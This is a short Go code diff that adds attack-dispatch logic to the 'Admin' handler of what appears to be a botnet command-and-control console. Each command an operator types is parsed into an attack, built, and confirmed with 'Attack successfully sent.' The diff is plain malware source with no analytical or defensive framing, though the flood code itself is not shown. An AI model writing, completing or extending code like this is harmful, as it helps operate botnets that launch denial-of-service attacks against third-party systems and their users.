@@ -64,6 +64,17 @@ func (this *Admin) Handle() {
 		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" {
 			return
 		}
+		atk, err := NewAttack(cmd)
+		if err != nil {
+			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
+		} else {
+			err := atk.Build()
+			if err != nil {
+				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s", err.Error())))
+			} else {
+				this.SendMessage("\u001B[92mAttack successfully sent.\u001B[0m", true)
+			}
+		}
 	}
 }
 
